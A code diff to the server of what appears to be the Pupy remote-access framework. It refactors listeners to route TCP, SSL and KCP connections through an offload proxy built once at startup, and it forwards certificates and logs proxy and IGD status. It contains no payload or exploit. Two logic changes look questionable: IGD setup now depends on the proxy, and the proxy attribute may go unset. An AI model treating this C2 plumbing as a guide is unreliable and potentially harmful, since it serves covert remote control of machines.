@@ -67,7 +67,7 @@ class PupyKCPSocketStream(PupySocketStream):
         self.KEEP_ALIVE_REQUIRED = 15
 
 class Listener(Thread):
-    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None):
+    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None, pproxy=None):
         Thread.__init__(self)
         self.daemon = True
 
@@ -84,6 +84,7 @@ class Listener(Thread):
         # Where to connect
         self.external = external
         self.external_port = None
+        self.pproxy = pproxy
 
         # Where to bind
         self.address = local or ''
@@ -135,7 +136,10 @@ class Listener(Thread):
                 port = args[0]
                 self.ipv6 = False
 
-        if not self.external or self.external in ('?', 'igd') :
+        if self.pproxy:
+            self.external = self.pproxy.external
+
+        elif not self.external or self.external in ('?', 'igd') :
             # If IGD enabled then we likely want to have mappings
             # Why to have mappings if our external IP remains empty?
             if self.igd and self.igd.available:
@@ -216,43 +220,31 @@ class Listener(Thread):
         external_port = self.external_port
         authenticator = self.authenticator
 
-        if self.pupsrv:
-            offload_server = self.pupsrv.config.get('pupyd', 'offload_server')
-            ca = self.pupsrv.config.get('pupyd', 'offload_server_ca')
-            key = self.pupsrv.config.get('pupyd', 'offload_server_key')
-            cert = self.pupsrv.config.get('pupyd', 'offload_server_crt')
-
-            if offload_server and ca and key and cert:
-
-                print "ORIGINAL STREAM: ", stream, type(stream)
-                print "ORIGINAL AUTHENTICATOR: ", authenticator, type(authenticator)
-
-                if type(authenticator) == PupySSLAuthenticator:
-                    extra = {
-                        'certs': {
-                            'ca': authenticator.castr,
-                            'cert': authenticator.certstr,
-                            'key': authenticator.keystr,
-                        }
+        if self.pproxy:
+            if type(authenticator) == PupySSLAuthenticator:
+                extra = {
+                    'certs': {
+                        'ca': authenticator.castr,
+                        'cert': authenticator.certstr,
+                        'key': authenticator.keystr,
                     }
-                else:
-                    extra = {}
+                }
+            else:
+                extra = {}
 
-                proxy = PupyOffloadManager(offload_server, ca, key, cert, extra)
+            if stream == PupyUDPSocketStream:
+                stream = PupyKCPSocketStream
+                method = self.pproxy.kcp
+            elif type(authenticator) == PupySSLAuthenticator:
+                method = self.pproxy.ssl
+            elif stream == PupySocketStream:
+                method = self.pproxy.tcp
 
-                if stream == PupyUDPSocketStream:
-                    stream = PupyKCPSocketStream
-                    method = proxy.kcp
-                elif type(authenticator) == PupySSLAuthenticator:
-                    method = proxy.ssl
-                elif stream == PupySocketStream:
-                    method = proxy.tcp
+            server = PupyTCPServer
 
-                server = PupyTCPServer
-
-                authenticator = None
-                ipv6 = False
-                igd = None
+            authenticator = None
+            ipv6 = False
+            igd = None
 
         self.server = server(
             PupyService,
@@ -268,12 +260,12 @@ class Listener(Thread):
             external_port=external_port
         )
 
-        if not ( proxy and method ):
+        if not ( self.pproxy and method ):
             return
 
         ## Workaround..
         self.server.listener.close()
-        self.server.listener = method(self.port)
+        self.server.listener = method(self.port, extra=extra)
 
     def run(self):
         self.server.start()
@@ -347,25 +339,41 @@ class PupyServer(object):
         self._cleanups = []
         self._singles = {}
 
+        offload_server = self.config.get('pupyd', 'offload_server')
+        ca = self.config.get('pupyd', 'offload_server_ca')
+        key = self.config.get('pupyd', 'offload_server_key')
+        cert = self.config.get('pupyd', 'offload_server_crt')
+
+        if offload_server and ca and key and cert:
+            try:
+                self.pproxy = PupyOffloadManager(
+                    offload_server, ca, key, cert)
+                self.motd['ok'].append('Using Pupy Offload Proxy: {}'.format(offload_server))
+            except Exception, e:
+                self.pproxy = None
+                self.motd['ok'].append('Using Pupy Offload Proxy: Failed: {}'.format(e))
+
         if self.config.getboolean('pupyd', 'httpd'):
             self.httpd = True
 
-        try:
+        if self.pproxy:
             try:
-                igd_url = None
-                igd_enabled = config.getboolean('pupyd', 'igd')
-            except ValueError:
-                igd = config.get('pupyd', 'igd')
-                if igd:
-                    igd_enabled = True
-                    igd_url = igd
+                try:
+                    igd_url = None
+                    igd_enabled = config.getboolean('pupyd', 'igd')
+                except ValueError:
+                    igd = config.get('pupyd', 'igd')
+                    if igd:
+                        igd_enabled = True
+                        igd_url = igd
 
-            self.igd = IGDClient(
-                available=igd_enabled,
-                ctrlURL=igd_url
-            )
-        except UPNPError as e:
-            pass
+                self.igd = IGDClient(
+                    available=igd_enabled,
+                    ctrlURL=igd_url
+                )
+                self.motd['ok'].append('IGDClient enabled')
+            except UPNPError as e:
+                self.motd['ok'].append('IGDClient failed: {}'.format(e))
 
         self.dnscnc = None
 
@@ -413,7 +421,8 @@ class PupyServer(object):
                 httpd=self.httpd,
                 igd=self.igd,
                 local=self.config.get('pupyd', 'address'),
-                external=self.config.get('pupyd', 'external')
+                external=self.config.get('pupyd', 'external'),
+                pproxy=self.pproxy
             ) for name in listeners
         }
         return self._listeners
